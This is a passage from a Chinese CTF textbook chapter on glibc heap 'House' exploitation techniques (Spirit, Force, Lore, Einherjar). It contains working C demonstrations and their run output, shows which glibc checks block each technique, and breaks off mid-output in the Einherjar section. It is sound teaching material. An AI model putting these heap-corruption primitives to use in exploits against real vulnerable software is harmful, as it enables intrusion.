---
chapter: PWN
section: House 系列攻击技术
order: 315
tags:
  - CTF
  - PWN
  - 堆
publish: true
---

# P15 House 系列攻击技术
## House Series Attacks

> [!info]- 章节信息
> **所属方向**：PWN ｜ **难度阶段**：L3 堆上利用期 ｜ **前置要求**：[[P12-glibc堆管理机制|P12]] · [[P14-tcache与fastbin利用|P14]]
> **本章目标**：把 House 系列的五个经典名字逐一讲透——每个按"核心思想 → 适用版本 → 哪个防御机制杀死了它 → 现代替代"四段式展开；2.43 上仍可行的（Spirit、Einherjar、Orange 前半）完整走到手，已死的（Force）在本机展示终止现场，并搭出 glibc 2.23 / 2.27 的历史环境把原始打法完整跑通作对照。House 家族之外，第 8 节补上常被并提的 largebin attack——unsorted bin attack 的现代后继。

## 1. House 系列：给历史技术建一套坐标系

[[P13-基础堆漏洞|P13]]、[[P14-tcache与fastbin利用|P14]] 讲的两条主线——悬垂指针/越界写拿到的编辑原语，兑换成 tcache poisoning 的任意地址分配——覆盖的是现代堆题的常规解法。堆利用还有一批以 House 命名的经典技术：它们大多诞生在 tcache 出现之前，攻击的落点是**别的 bin 结构、合并逻辑或 top chunk**，其中一部分在今天仍然可行，另一部分已经被 glibc 的历次加固逐条堵死。

==防御机制的演进本身就是最好的教材==：每个 House 对应管理器的一段"当年信任、如今检查"的数据，看清它死在哪一行检查上，比记住打法本身更有迁移价值。本章对每个 House 按四段式组织：

1. **核心思想**：它利用管理器的哪段逻辑；
2. **适用版本**：哪些行为前提使它成立；
3. **杀死它的防御机制**：哪一版加了什么检查、报错串长什么样；
4. **现代替代**：同样的需求今天走哪条路。

五个 House 的一览表（详细口径逐节展开）：

| 名字 | 核心思想 | 本机 glibc 2.43 现状 |
| ---- | ---- | ---- |
| House of Spirit | 伪造 size，把从未 malloc 过的地址 free 进 tcache | 仍可行（第 3 节完整演示） |
| House of Force | top 的 size 改成 -1，把 top 任意距离搬迁 | 已死：2.29 起检查 top size（第 4 节） |
| House of Lore | smallbin 的 bk 链伪造，第二跳返回伪造块 | 检查极老，写次数劣势明显（第 5 节） |
| House of Einherjar | 清 PREV_INUSE + 伪造 prev_size，把合并起点搬到任意地址 | 仍可构造（第 6 节完整演示） |
| House of Orange | 改小 top 逼 sysmalloc 释放旧 top——没有 free 的 free | 前半仍可行；完整链死于 2.29（第 7 节） |

> [!info]- 名字的由来
> Malloc Des-Maleficarum（Phrack 57，2005）一篇命名了 House of Prime、Spirit、Force、Lore；House of Orange 因 HITCON CTF 2016 的一道同名赛题的题解得名；House of Einherjar 由 Kernelhacks 在 2016 年发表。此外还有一个不断扩大的家族：House of Apple 1/2/3（现代 FSOP 主力，[[P16-FSOP与HouseofApple2|P16]] 整章讲第 2 型）、House of Banana / House of Cat（ld.so 侧的结构）、House of Emma（exit 处理链的指针加密）等——它们的共同点是把"写一个结构体"当成攻击入口，与本章五个鼻祖同一血统，第 9 节有对照。

版本口径沿用全书约定：主线按本机 glibc 2.43 讲解，行为差异集中在 [[P12-glibc堆管理机制#9. glibc 2.43 行为注记|P12 第 9 节]]的对照表；fastbin 相关内容以 [[P14-tcache与fastbin利用#5. fastbin 利用：历史技术（glibc ≤ 2.40）|P14 第 5 节]]的历史环境为准。本章额外搭一套 glibc 2.23 / 2.27 的历史环境，让"已死"的技术把原始打法完整走一遍。

## 2. 演示环境与历史环境搭建

### 2.1 本机演示程序

本章五个演示程序沿用全库惯例编译（x86-64 Linux / System V AMD64 ABI）：

```bash
gcc -O0 -g -fno-pie -no-pie 演示程序.c -o 演示程序
```

堆的现场观察用 [[P12-glibc堆管理机制#7. 调试方法：GDB 原生加自写堆观察脚本|P12 第 7 节]]的 `heapview.py` + `tcacheview.py`，不重复贴。本章的演示程序在每个关键步骤自带打印（地址、字段值、判断结果），程序输出本身已足够读懂现场。地址口径说明与 [[P14-tcache与fastbin利用#2. 演示程序与调试装备|P14 第 2 节]]一致：ASLR 开着，每次运行的数值都不同，==形状与相对关系不变==，对照输出时以形状为准。

### 2.2 历史环境：docker 取老 glibc + patchelf 换载

第 4、5 节需要在 glibc 2.23 / 2.27 上运行同一份源码。完整步骤四步——**取老 libc、在老容器里编译、组织运行目录、patchelf 切换**：

第一步，从 ubuntu:18.04（glibc 2.27）取出 libc 与动态链接器：

```bash
docker pull ubuntu:18.04
docker create --name p15extract ubuntu:18.04
docker cp p15extract:/lib/x86_64-linux-gnu/libc-2.27.so .
docker cp p15extract:/lib/x86_64-linux-gnu/ld-2.27.so .
docker rm p15extract
```

第二步，编译要在老容器里做：新工具链编译的二进制按新符号版本引用 libc（[[P14-tcache与fastbin利用#10. 常见问题|P14 常见问题]]的 `version 'GLIBC_2.34' not found` 一条），patchelf 换载救不了它。ubuntu:18.04 的 apt 源已收缩、gcc 装不上，改用 ubuntu:16.04——它的产物引用的符号版本不超过 2.23，2.23 与 2.27 的 libc 都能装载。容器与宿主的目录不能直接互见，源码用 `docker cp` 进出：

```bash
docker create --name p15b ubuntu:16.04 sleep 600
docker start p15b
docker cp force.c p15b:/tmp/
docker exec p15b bash -c 'printf "deb http://archive.ubuntu.com/ubuntu xenial main universe\ndeb http://archive.ubuntu.com/ubuntu xenial-updates main universe\n" > /etc/apt/sources.list && apt-get update && apt-get install -y gcc libc6-dev && cd /tmp && gcc -O0 -fno-pie -no-pie force.c -o force23'
docker cp p15b:/tmp/force23 .
docker rm -f p15b
```

顺手把 2.23 的 libc 与 ld 也从容器里取出来（`docker cp p15b:/lib/x86_64-linux-gnu/libc-2.23.so .` 与 ld 同理）。第三步，为两个版本各建一个运行目录——ld.so 按 `libc.so.6` 这个名字找 libc，所以改名放一份副本：

```bash
mkdir -p 27 23
cp libc-2.27.so 27/libc.so.6 && cp ld-2.27.so 27/
cp libc-2.23.so 23/libc.so.6 && cp ld-2.23.so 23/
```

第四步，patchelf 改写二进制的解释器路径与库搜索路径（工具本体见 [[P03-ELF链接与延迟绑定#5.3 patchelf：把题目环境装到本地|P3 5.3]]）：

```bash
patchelf --set-interpreter $PWD/27/ld-2.27.so --set-rpath $PWD/27 force23
./force23        # 这次运行时加载的就是 glibc 2.27
```

换到 2.23 只需把两个参数换成 `23/` 目录再打一遍。==同一份二进制、两套解释器路径==，就是本章对照 2.23 与 2.27 的全部机关。

## 3. House of Spirit：把不属于堆的内存 free 进去

### 3.1 核心思想：free 信任 size

malloc 的返回值是"分配器欠你的一块内存"，而 free 的职责是把它收回来登记。问题在于：==free 判断"这是一块合法的堆块"的依据，只有你传进来的指针加上指针前 8 字节的 size 槽==。如果能在一片非堆内存（全局数组、栈缓冲）里摆好一个 size 槽，再把"mem 地址"喂给 free，分配器就会照单全收——把它登记进 tcache；之后一次同档 malloc，这片内存就从分配器手里"合法"地交了出来。

[[P12-glibc堆管理机制#5. free 的主干流程|P12 第 5 节]]的 free 流程里，tcache 出口（第 4 步）排在合并检查（第 7 步）之前。走到 tcache 出口前真正会拦路的检查只有两条：

- **对齐**：mem − 0x10 的 chunk 地址必须是 0x10 的倍数，否则 `free(): invalid pointer`；
- **size 合法**：剥掉标志位后不小于 0x20、且是 0x10 的倍数，否则 `free(): invalid size`。

==没有对"下一个 chunk"的任何检查==——这是 tcache 时代对 Spirit 的"减负"：tcache 出现之前，free 走 fastbin 路径还要检查下一个 chunk 的 size 槽（`free(): invalid next size (fast)`），伪造块必须连"邻居"一起造；tcache 路径只看伪造块自己。

### 3.2 完整演示：free 一片从未 malloc 过的内存

```c
/* spirit.c —— House of Spirit 演示（x86-64 Linux，glibc 2.43）
 * argv[1]：
 *   ok   —— size 槽写 0x61，free 后 malloc(0x58) 拿回 fake+0x10
 *   bad1 —— mem 未对齐（free(fake+0x8)）→ free(): invalid pointer
 *   bad2 —— size 槽留 0 → free(): invalid size
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static char fake[0x70] __attribute__((aligned(0x10)));

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    const char *mode = (argc > 1) ? argv[1] : "ok";

    printf("fake 数组 @ %p（chunk 视角）\n", (void *)fake);

    if (strcmp(mode, "ok") == 0) {
        *(unsigned long *)(fake + 8) = 0x61;      /* size 槽：0x60 | PREV_INUSE */
        printf("[1] fake+8 写入 size = %#lx\n", *(unsigned long *)(fake + 8));
        free(fake + 0x10);                        /* mem = fake+0x10 → chunk = fake */
        puts("[2] free(fake+0x10) 通过：这块内存从未 malloc 过");
        char *p = malloc(0x58);                   /* nb = 0x60，命中 tcache[0x60] */
        printf("[3] malloc(0x58) = %p（fake+0x10 = %p）\n", p, fake + 0x10);
        if (p == fake + 0x10) {
            strcpy(p, "SPIRIT PWNED");
            printf("[4] 写入读回：%s\n", p);
        }
    } else if (strcmp(mode, "bad1") == 0) {
        *(unsigned long *)(fake + 8) = 0x61;
        free(fake + 0x8);                         /* mem 未对齐：chunk = fake-0x8 */
        puts("unreachable");
    } else {                                      /* bad2 */
        free(fake + 0x10);                        /* fake+8 保持 0：chunksize = 0 */
        puts("unreachable");
    }
    return 0;
}
```

`ok` 模式的输出：

```text
fake 数组 @ 0x404050（chunk 视角）
[1] fake+8 写入 size = 0x61
[2] free(fake+0x10) 通过：这块内存从未 malloc 过
[3] malloc(0x58) = 0x404060（fake+0x10 = 0x404060）
[4] 写入读回：SPIRIT PWNED
```

逐步对照 3.1 的清单：`fake + 8` 的 `0x61` 让分配器把全局数组认成一块 0x60 的 chunk（`fake` 本身就是 chunk 地址，mem = `fake + 0x10`）；free 走 tcache 出口登记进 `tcache[0x60]`；`malloc(0x58)` 换算出 nb = 0x60，从 tcache 弹出——==分配器亲手把一片从未 malloc 过的全局数组交付了出来==。本机 2.43 上这条链完整成立。

两条检查各自的失败现场（`bad1` 与 `bad2`）：

```text
fake 数组 @ 0x404050（chunk 视角）
free(): invalid pointer
bash: line 1:  4053 Aborted                    ./spirit bad1
```

```text
fake 数组 @ 0x404050（chunk 视角）
free(): invalid size
bash: line 1:  4054 Aborted                    ./spirit bad2
```

> [!note] 编译器对演示源码的警告
> 新版 gcc 对 `spirit.c` 这类源码会给出 `-Wfree-nonheap-object` 警告——它看见对静态对象调用 free。真实题目里 free 的参数来自运行期数据（输入、菜单下标换算），编译器无从判断，这道警告不会出现；自己写 demo 时把它当提示看即可。

### 3.3 适用版本与现代用途

House of Spirit 的成立前提（free 信任 size + tcache 出口检查面小）在 2.26 之后的每个版本上都成立，==2.43 仍是它的主场==。历史版本里它反而更难：进 fastbin 要多造一个合法的"下一个 chunk"头，进 unsorted 要过合并检查组——tcache 把伪造块的义务缩到了一个 size 槽。

现代堆题里它的位置：[[P14-tcache与fastbin利用|P14]] 的 tcache poisoning 需要"一次写 + 一次泄露"，House of Spirit 提供的是另一款兑换——==只要能在目标附近摆一个 size 槽、又能控制一次 free 的参数，就能不碰任何链表拿到目标地址的分配==。两者的前提互有长短：poisoning 要求编辑进已 free 的块，Spirit 要求对目标区域自身的写入。做题时按手里有的原语选路。

## 4. House of Force：对 top 的信任崩塌（2.29 已死）

### 4.1 核心思想：size 槽说够分，就够分

[[P12-glibc堆管理机制#3.5 top chunk：堆尾的余料|P12 3.5]]讲过 top chunk 是堆尾的余料，malloc 在所有 bin 都无法满足时切它。切分的判断只有一行：top 的 size 够 nb + MINSIZE 就切。==这条路径上没有任何"top 的 size 是否可信"的核对==——早年 glibc 完全信任 size 槽。于是：

1. 越界写把 top 的 size 改成 `-1`（最大的无符号数）——从此"永远够分"；
2. 请求一个精心计算的距离，把 top 搬到任意目标地址：

$$\text{nb} = \text{goal} - \text{top} - 0\mathrm{x}10 \tag{15.1}$$

   top 分割后新 top 落在 goal − 0x10，malloc 返回的是 chunk + 0x10——正好是 goal。目标低于 top 时（比如 bss），式 15.1 是负数，按无符号数回绕成巨大值，分割算术全程按模 2⁶⁴ 自洽，照样成立；
3. 下一次正常请求，分配器把 goal 当作堆块交付。

### 4.2 历史环境：2.27 / 2.23 上的完整打法

```c
/* force.c —— House of Force 演示，一份源码两种结局（x86-64 Linux）
 * 目标选 bss 里的全局数组（低于堆）：距离请求按无符号数回绕。
 *   glibc ≤ 2.28：分割无检查，第 2 次 malloc 返回目标地址 —— 攻击成立
 *   glibc 2.29+ ："malloc(): corrupted top size"
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static char buf[0x80] __attribute__((aligned(0x10)));   /* 利用目标：bss */

int main(void) {
    setbuf(stdout, NULL);

    char *p = malloc(0x18);                        /* 触发堆诞生，p 的 chunk 紧邻 top */
    unsigned long top = (unsigned long)p + 0x10;   /* p 的 chunk(0x20) 之后就是 top */
    unsigned long goal = (unsigned long)buf + 0x10;/* 目标：buf 数据区，0x10 对齐 */
    printf("p = %p\ntop = %p\nbuf = %p（goal = %p）\n",
           p, (void *)top, buf, (void *)goal);

    /* 漏洞原语：越界写把 top 的 size 槽改成 -1 */
    *(unsigned long *)(top + 8) = ~(unsigned long)0;
    printf("[1] top size 槽改为 %#lx\n", *(unsigned long *)(top + 8));

    /* 第 1 次请求：nb = goal - top - 0x10（式 15.1，负距离回绕） */
    unsigned long dist = goal - top - 0x18;
    printf("[2] malloc(%#lx)（距离请求）\n", dist);
    void *q = malloc(dist);
    printf("[3] 第 1 次 malloc = %p\n", q);

    void *r = malloc(0x60);
    printf("[4] 第 2 次 malloc = %p（goal = %p）\n", r, (void *)goal);
    if (r == (void *)goal) {
        strcpy(r, "FORCE PWNED");
        printf("[5] 写入读回：%s\n", buf + 0x10);
    }
    return 0;
}
```

按第 2 节的流程在老容器里编译出 `force23`，patchelf 到 2.27 上运行：

输出：

```text
p = 0x37bec260
top = 0x37bec270
buf = 0x601060（goal = 0x601070）
[1] top size 槽改为 0xffffffffffffffff
[2] malloc(0xffffffffc8a14de8)（距离请求）
[3] 第 1 次 malloc = 0x37bec280
[4] 第 2 次 malloc = 0x601070（goal = 0x601070）
[5] 写入读回：FORCE PWNED
```

逐步对照 4.1：全程没有一次 free 调用，`[2]` 的距离请求是回绕后的巨大值 `0xffffffffc8a14de8`，top 的假 size 让它"够分"；分割把 top 搬到 `goal − 0x10`，`[4]` 的第二次请求把 bss 里的 `buf + 0x10` 当作堆块交付。换到 2.23 的 loader 再跑一遍，输出同形（同样以 `[5] 写入读回：FORCE PWNED` 收尾）——==2.28 及以前的 glibc 对这套打法没有任何抵抗==。

### 4.3 死亡现场：2.43 上的同一份源码

```bash
gcc -O0 -g -fno-pie -no-pie force.c -o force && ./force
```

输出：

```text
p = 0x15b05010
top = 0x15b05020
buf = 0x404040（goal = 0x404050）
[1] top size 槽改为 0xffffffffffffffff
[2] malloc(0xffffffffea8ff018)（距离请求）
[3] 第 1 次 malloc = (nil)
malloc(): corrupted top size
bash: line 1:  3964 Aborted                    ./force
```

两层防线先后到场：

- **距离请求本身被拒**：`[3]` 返回 nil——超出请求上限的分配在入口就被拒绝，根本没碰到堆；
- **伪造的 top size 活不过下一次分配**：`[1]` 写进去的 `-1` 还留在堆上，`malloc(0x60)` 走到 top 分割路径时触发终止，报错串是 `malloc(): corrupted top size`。这条检查的内容一句话：==top 的 size 不得超过本 arena 的 system_mem（当前堆总大小）==——`-1` 与任何伪造的巨值都过不去。它是 glibc 2.29 加入的（2.27 的 libc 里没有这条报错串，2.43 有）。

此外 sysmalloc 入口还躺着一道更老的断言，要求 top 的 size 满足"不小于 MINSIZE、带 PREV_INUSE、old_end 页对齐"三条件（它的完整原文在第 7 节还会见到——House of Orange 的伪造 size 恰好要逐条伺候它）。==两道防线一个管"分配时"，一个管"扩堆时"，Force 的伪造 size 在哪条路上都活不过第一站==。

### 4.4 现代替代

Force 的需求——"让分配器把任意地址当堆块交付"——在 2.43 上由 [[P14-tcache与fastbin利用|P14]] 的 tcache poisoning 与本章第 5、7 节的路线承接；而"把 top 长距离搬迁"这个具体手法没有对应物：top 的 size 一旦不可信就被拒绝，==规划堆布局的任务整体移交给了堆风水==（[[P17-堆风水与通用利用思路|P17]]）。读老题解时，所有"改 top size → 巨型 malloc → 搬 top"的步骤在 2.43 上直接作废，替换思路是拿同样的编辑原语去改 tcache/smallbin 的链。

## 5. House of Lore：smallbin 链上的第二跳

### 5.1 核心思想：bk 侧取块，两跳到伪造块

smallbin 是双链 FIFO（[[P12-glibc堆管理机制#3.2 smallbin：精确尺寸的双链|P12 3.2]]）：malloc 从 bk 侧取块。House of Lore 把这一取当成跳板：

1. 让目标尺寸的 chunk 进 smallbin，并拿到其中一个的读写能力；
2. 把 `bin->bk` 侧那块（记作 victim）的 bk 改成伪造块 fake1 的地址；
3. 第一次 malloc 命中 smallbin：分配器把 victim 交付，同时执行链摘除——`bin->bk = victim->bk`，==伪造块 fake1 就此登记成新的"下一个该被取走的块"==，`fake1->fd` 还被写入 bin 链表头（一个 libc 地址，顺带的泄露）；
4. 第二次 malloc：分配器按 bk 侧取块，交付的就是 fake1 的 mem。

### 5.2 那道著名的检查：bck->fd == victim

链摘除前，分配器核对双向一致性：读出 `bck = victim->bk`，要求 `bck->fd == victim`——==邻居必须互相指回来==，与 [[P12-glibc堆管理机制#6.1 后向合并：PREV_INUSE 为 0 时吃掉前块|P12 6.1]]unlink 的检查同源。伪造块没伪造 fd，检查当场终止，报错串是 `malloc(): smallbin double linked list corrupted`。

这道检查比多数资料的口径更老：==2.23 的 libc 里就有同一串报错、同样在第一跳拦下==——"House of Lore 死于 2.26"之类的时间线说法与手头三套环境的行为都对不上。它在现代版本上的现状，用第 5.3 的演示程序在同一份源码上逐版本看清。

### 5.3 演示：三种版本 × 两种伪造

```c
/* lore.c —— House of Lore 演示（x86-64 Linux）
 * 用法：./lore <填充数> <模式>
 *   填充数：装满 tcache[0x90] 的 free 次数（2.43 填 16，2.27 填 7，2.23 填 0）
 *   classic：只改 victim->bk = fake1（原始打法，单处写）
 *   forge  ：再伪造 fake1/fake2 的 fd、bk（应付 bck->fd == victim 检查）
 * 布局：0x90 的 chunk 超出 fastbin 范围（≤0x80）；a、b 之间垫在用块——
 * tcache 满后的 free 走合并路径，相邻空闲块会被并成一块。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static char fakebuf[0x120] __attribute__((aligned(0x10)));
static void *fill[16];
static void *drain[16];

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    int nfill = (argc > 1) ? atoi(argv[1]) : 7;
    int forge = (argc > 2 && strcmp(argv[2], "forge") == 0);

    char *fake1 = fakebuf;            /* 伪造块 1：fakebuf 起（chunk 地址） */
    char *fake2 = fakebuf + 0x90;     /* 伪造块 2：链尾替身 */

    char *a = malloc(0x88);           /* nb = 0x90 */
    char *sp = malloc(0x18);          /* 垫块：隔开 a、b，防合并 */
    char *b = malloc(0x88);
    char *guard = malloc(0x18);       /* 隔开 top */
    (void)sp; (void)guard;
    printf("a = %p\nb = %p\nfake1 = %p\nfake2 = %p\n", a, b, fake1, fake2);

    for (int i = 0; i < nfill; i++) fill[i] = malloc(0x88);
    for (int i = 0; i < nfill; i++) free(fill[i]);     /* 装满 tcache[0x90] */
    free(a);
    free(b);                                           /* a、b 进 smallbin 路径 */
    void *big = malloc(0x508);                         /* 触发 unsorted 遍历：
                                                          老版本里 a、b 由此归位 smallbin */
    (void)big;
    for (int i = 0; i < nfill; i++) drain[i] = malloc(0x88);   /* 清空 tcache */

    /* 找 bin->bk 侧的块（第一跳被服务的那个）：它的 fd 指向 libc 链表头 */
    unsigned long *ua = (unsigned long *)a;
    unsigned long *ub = (unsigned long *)b;
    printf("a->fd = %#lx a->bk = %#lx\n", ua[0], ua[1]);
    printf("b->fd = %#lx b->bk = %#lx\n", ub[0], ub[1]);
    unsigned long *v = (ua[0] > 0x100000000UL) ? ua : ub;
    unsigned long bin_head = v[0];
    printf("victim（bin->bk 侧）= %p，bin 链表头 @ %#lx\n", (void *)v, bin_head);

    /* 漏洞原语：UAF 改 victim 的 bk（mem+0x8 = chunk+0x18） */
    v[1] = (unsigned long)fake1;
    unsigned long *f1 = (unsigned long *)fake1;
    unsigned long *f2 = (unsigned long *)fake2;
    if (forge) {
        /* 伪造块的 fd/bk 在 chunk+0x10 / +0x18；fd 存 chunk 地址 */
        f1[2] = (unsigned long)v - 0x10;  /* fake1->fd = victim 的 chunk 地址 */
        f1[3] = (unsigned long)fake2;     /* fake1->bk = fake2 */
        f2[2] = (unsigned long)fake1;     /* fake2->fd = fake1：第二跳的同一道检查 */
        f2[3] = bin_head;                 /* fake2->bk = 链表头：循环从这里正常收尾 */
    }
    puts(forge ? "[1] victim->bk = fake1，fake1/fake2 的 fd、bk 已伪造"
               : "[1] victim->bk = fake1（单处写）");

    void *m1 = malloc(0x88);
    printf("[2] 第 1 次 malloc = %p\n", m1);
    void *m2 = malloc(0x88);
    printf("[3] 第 2 次 malloc = %p\n", m2);
    void *m3 = malloc(0x88);
    printf("[4] 第 3 次 malloc = %p\n", m3);
    void *hit = (m1 == fake1 + 0x10) ? m1 : (m2 == fake1 + 0x10) ? m2
              : (m3 == fake1 + 0x10) ? m3 : (m2 == fake2 + 0x10) ? m2
              : (m3 == fake2 + 0x10) ? m3 : NULL;
    if (hit) {
        strcpy(hit, "LORE PWNED");
        printf("[5] 伪造块到手（%s），写入读回：%s\n",
               hit == fake1 + 0x10 ? "fake1" : "fake2", (char *)hit);
    }
    return 0;
}
```

**classic 模式，三个版本一个结局。**2.43：

输出：

```text
a->fd = 0x7f428c412b48 a->bk = 0x1dd670b0
b->fd = 0x1dd67000 b->bk = 0x7f428c412b48
victim（bin->bk 侧）= 0x1dd67010，bin 链表头 @ 0x7f428c412b48
[1] victim->bk = fake1（单处写）
malloc(): smallbin double linked list corrupted
bash: line 1:  4056 Aborted                    ./lore 16 classic
```

第一跳的入口检查把单处伪造拦下。2.27 上（`./lore23 7 classic`）输出同形、终止于同一条报错；2.23 上（`./lore23 0 classic`）同样在第一跳终止（进程直接 Aborted；这个版本号的 fatal 消息不经 stderr 输出，重定向里看不见，检查本体在 libc 里同在）。==原始打法的单处写在手头三个版本上无一幸免==。

**forge 模式，把检查应付过去之后，三个版本都能走到伪造块。**2.43：

输出：

```text
a->fd = 0x7e07fb012b48 a->bk = 0x2019b0b0
b->fd = 0x2019b000 b->bk = 0x7e07fb012b48
victim（bin->bk 侧）= 0x2019b010，bin 链表头 @ 0x7e07fb012b48
[1] victim->bk = fake1，fake1/fake2 的 fd、bk 已伪造
[2] 第 1 次 malloc = 0x2019b010
[3] 第 2 次 malloc = 0x404120
[4] 第 3 次 malloc = 0x404090
[5] 伪造块到手（fake1），写入读回：LORE PWNED
```

三跳读法：第一跳交付真块 a；==2.43 的 smallbin 命中还带"余块批量搬进 tcache"==（[[P14-tcache与fastbin利用#7. tcache stashing unlink attack：2.43 上依然成立|P14 第 7 节]]的暂存循环），它顺着被改的 bk 走进 fake1、fake2，把两块都塞进 `tcache[0x90]`；第二、三跳从 tcache 按 LIFO 弹出——先 fake2、后 fake1，==伪造块经 tcache 转手交付==。2.27 上同源码输出同形（m2 = fake2、m3 = fake1）——smallbin 命中后的暂存行为在 2.27 就已存在，并非 2.29 才引入。

> [!info]- 2.23 的 forge：原始的两跳形状
> 2.23 没有暂存行为，链摘除后伪造块还在 bin 上等第二轮：`./lore23 0 forge` 的第二跳直接交付 `fake1 + 0x10`（0x6020b0）——这才是 5.1 描述的原始两跳。第三跳会终止：链上只剩 fake2 时，检查去核对链表头的 fd，对不上就报错收场。伪造链要么按暂存的形状收尾（fake2->bk 指回链表头），要么交付到手就收手——把利用做完，别贪第三跳。

### 5.4 现代地位：写次数的全面劣势

把 forge 模式凑齐的条件列成账：victim 的 bk、fake1 的 fd、fake1 的 bk、fake2 的 fd，加上暂存收尾要的 fake2 的 bk——==五处写==，外加一次 libc 泄露（链表头）。[[P14-tcache与fastbin利用#3. tcache poisoning：完整主线|P14 第 3 节]]的 tcache poisoning 只需要一处写加一次泄露。同一个"任意地址分配"的目标，Lore 的代价是 poisoning 的数倍——==它没有被哪一道检查彻底杀死，而是被更便宜的路线淘汰了==。

它留下的两个可迁移的资产：一是 bk 侧遍历不查双向一致性这个攻击面本身——现代版本上沿它打法的是 [[P14-tcache与fastbin利用#7. tcache stashing unlink attack：2.43 上依然成立|P14 第 7 节]]的 tcache stashing unlink attack；二是 5.3 的调试细节——伪造块的 fd/bk 在 **chunk+0x10 / +0x18**、fd 存 chunk 地址，与 tcache 链的 mem 地址差 0x10，混用是这一带最常见的出错点。

> [!info]- 落点选错端的现场
> 5.3 的演示程序曾有一版把伪造落点选成"先被服务的块"（fd 指向链表头的那个端）——在 2.43 上第一跳检查通过、真块被交付，随后==暂存循环顺着被改的 bk 走进伪造块，读出 0 当 bk 解引用，段错误==，崩点在 `_int_malloc` 的暂存写入一行。这段经历说明两件事：入口检查拦的是"bin->bk 侧那块的 bk"；而一旦绕过它走暂存路线，伪造链的每个 bk 都会被读到，==链尾必须指回链表头==让循环正常收尾（[[P14-tcache与fastbin利用#7.4 一个值得记的坑：链表头认错之后|P14 7.4]]的同款教训）。

## 6. House of Einherjar：把合并起点搬到伪造块

### 6.1 核心思想：后向合并的起点由 prev_size 决定

[[P12-glibc堆管理机制#6.1 后向合并：PREV_INUSE 为 0 时吃掉前块|P12 6.1]]的后向合并逻辑：free 一块时若发现**自己**的 PREV_INUSE 是 0，就从自己的 prev_size 读出前块大小，`p -= prevsize` 定位前块，把它 unlink 进来合并。==起点 p 是算出来的，分配器对"算出来的地址"本身不做位置检查==——prev_size 写多少，合并就从哪里开始。House of Einherjar 把 prev_size 指向一片提前摆好的伪造块，合并的起点就此搬到伪造块所在地址；合并出的大块进 unsorted，下一次同尺寸 malloc 把它交付出来。

伪造块要伺候的检查与 unlink 完全一致（[[P12-glibc堆管理机制#6.1 后向合并：PREV_INUSE 为 0 时吃掉前块|P12 6.1]]）：

| 检查 | 条件 |
| ---- | ---- |
| 大小一致性 | 伪造块的 size == victim 的 prev_size |
| 双向一致性 | 伪造块的 fd->bk 与 bk->fd 都指回自己——fd、bk 都写自己的地址即可 |
| next 头合法 | victim 的下一个 chunk 的 size 槽在 (0x10, system_mem) 内、PREV_INUSE 为 1 |

外加两条布局前提：victim 所在 tcache 档已满（否则 free 走 tcache 出口，根本不合并）；victim 的 size 槽被清掉 PREV_INUSE 位。==清位与写 prev_size 这两个动作，正是 off-by-null 一族漏洞的标准产物==——off-by-null 清掉相邻块 size 槽的最低字节（`0x101 → 0x100`，恰好"大小不变、PREV_INUSE 消失"），victim 的 prev_size 槽则归前一块的用户数据区，一次正常的数据编辑就能写上。

### 6.2 完整演示：2.43 上合并进伪造块

```c
/* einherjar.c —— House of Einherjar 演示（x86-64 Linux，glibc 2.43）
 * 布局：[F（承载伪造块）][A（nb 0x500）][V（nb 0x100）][guard][垫块×16][top]
 *   A 的最后 8 字节 = V 的 prev_size 槽（前块在用时归前块数据用）
 *   A 的数据末尾再越界 1 字节 = V 的 size 槽低字节（off-by-null）
 * 落点选在堆内：另一块的 user data 中间。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void *filler[16];

int main(void) {
    setbuf(stdout, NULL);
    char *F = malloc(0xf8);           /* 承载伪造块，保持分配 */
    char *A = malloc(0x4f8);          /* nb = 0x500 */
    char *V = malloc(0xf8);           /* nb = 0x100，size 槽 0x101 */
    char *G = malloc(0x18);           /* 隔开 top，保持 V 的 next 头合法 */
    unsigned long fchunk = ((unsigned long)F + 0x10);   /* 伪造块起点：F 数据区内 */
    unsigned long vchunk = (unsigned long)V - 0x10;
    printf("F = %p（伪造块 chunk 视角 = %p）\n", F, (void *)fchunk);
    printf("V = %p（chunk %p）\n", V, (void *)vchunk);

    /* 1. 装满 tcache[0x100]（16 个）：让 free(V) 走合并路径 */
    for (int i = 0; i < 16; i++) filler[i] = malloc(0xf8);
    for (int i = 0; i < 16; i++) free(filler[i]);

    /* 2. 伪造块：size = 距离（unlink 核对 prev_size），fd/bk 自指（过双向检查） */
    unsigned long dist = vchunk - fchunk;          /* V 到伪造块的距离，0x10 对齐 */
    *(unsigned long *)(fchunk + 0x08) = dist;      /* fake->size = dist */
    *(unsigned long *)(fchunk + 0x10) = fchunk;    /* fake->fd = fake */
    *(unsigned long *)(fchunk + 0x18) = fchunk;    /* fake->bk = fake */

    /* 3. prev_size：A 的最后 8 字节就是 V 的 prev_size 槽（合法数据写） */
    *(unsigned long *)(A + 0x4f0) = dist;
    /* 4. off-by-null：A 数据末尾再越界 1 字节，清 V 的 PREV_INUSE（0x101→0x100） */
    A[0x4f8] = '\0';
    printf("V 的 size 槽 = %#lx（PREV_INUSE 已清）prev_size = %#lx\n",
           *(unsigned long *)(vchunk + 8), *(unsigned long *)(vchunk));

    /* 5. free(V)：后向合并吃掉"前块"，合并块起点 = 伪造块，进 unsorted */
    free(V);
    unsigned long mfd = *(unsigned long *)(fchunk + 0x10);
    printf("free 后伪造块的 fd = %#lx（%s）\n", mfd,
           mfd > 0x100000000UL ? "指向 main_arena：合并块进了 unsorted" : "未变化");

    /* 6. 同尺寸 malloc：合并块被交付，mem = 伪造块 + 0x10（落在 F 的数据区里） */
    void *p = malloc(dist + 0x100 - 0x10);
    printf("malloc(%#lx) = %p（伪造块+0x10 = %p，F 的数据区内）\n",
           dist + 0x100 - 0x10, p, (void *)(fchunk + 0x10));
    if (p == (void *)(fchunk + 0x10)) {
        strcpy(p, "EINHERJAR PWNED");
        printf("写入读回：%s（F 与 p 重叠，改这里 = 改已分配的 F）\n", (char *)F + 0x20);
    }
    return 0;
}
```

输出（本机 glibc 2.43）：

```text
F = 0x31e01010（伪造块 chunk 视角 = 0x31e01020）
V = 0x31e01610（chunk 0x31e01600）
V 的 size 槽 = 0x100（PREV_INUSE 已清）prev_size = 0x5e0
free 后伪造块的 fd = 0x7bb6bf812ac8（指向 main_arena：合并块进了 unsorted）
